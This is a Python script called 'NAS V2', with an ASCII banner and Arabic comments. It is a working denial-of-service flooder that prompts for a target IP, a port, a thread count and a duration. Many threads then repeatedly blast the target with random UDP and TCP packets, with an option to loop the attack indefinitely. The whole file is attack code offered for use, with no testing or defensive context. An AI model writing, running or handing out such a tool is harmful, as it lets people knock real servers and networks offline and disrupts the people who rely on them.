
import socket
import threading
import random
import time

print("""
[1;35m
███╗   ██╗ █████╗ ███████╗    ██╗   ██╗██╗     ██████╗ ██████╗  █████╗ 
████╗  ██║██╔══██╗██╔════╝    ██║   ██║██║     ██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║███████║███████╗    ██║   ██║██║     ██████╔╝██████╔╝███████║
██║╚██╗██║██╔══██║╚════██║    ██║   ██║██║     ██╔═══╝ ██╔═══╝ ██╔══██║
██║ ╚████║██║  ██║███████║    ╚██████╔╝███████╗██║     ██║     ██║  ██║
╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝     ╚═╝  ╚═╝
          NAS V2
""")

target = input("Target IP: ")
port = int(input("Port: "))
threads = int(input("Threads: "))
duration = int(input("Duration (seconds): "))
loop_mode = input("Loop after finish? (y/n): ").lower().strip() == "y"
sockets_per_thread = int(input("Sockets per Thread: "))

def generate_data():
    size = random.randint(512, 2048)
    return random._urandom(size)

def ultra_mixed_attack():
    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(sockets_per_thread):
            try:
                tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                tcp.settimeout(1)

                data = generate_data()

                # إرسال UDP
                for _ in range(5):
                    udp.sendto(data, (target, port))

                # إرسال TCP
                try:
                    tcp.connect((target, port))
                    for _ in range(5):
                        tcp.send(data)
                    tcp.close()
                except:
                    pass
                udp.close()
                print(f"[ULTRA] Sent mixed packets to {target}:{port}")
            except:
                continue

def show_stats():
    end = time.time() + duration
    while time.time() < end:
        print(f"[STATS] Active Threads: {threading.active_count()}", end="\r")
        time.sleep(1)
    print("\n[+] Attack finished.")

def run_attack():
    print(f"Launching NAS ULTRA attack on {target}:{port}...")
    threading.Thread(target=show_stats).start()
    for _ in range(threads):
        threading.Thread(target=ultra_mixed_attack).start()

# تشغيل مرة واحدة أو بشكل دائري
while True:
    run_attack()
    time.sleep(duration + 2)
    if not loop_mode:
        break
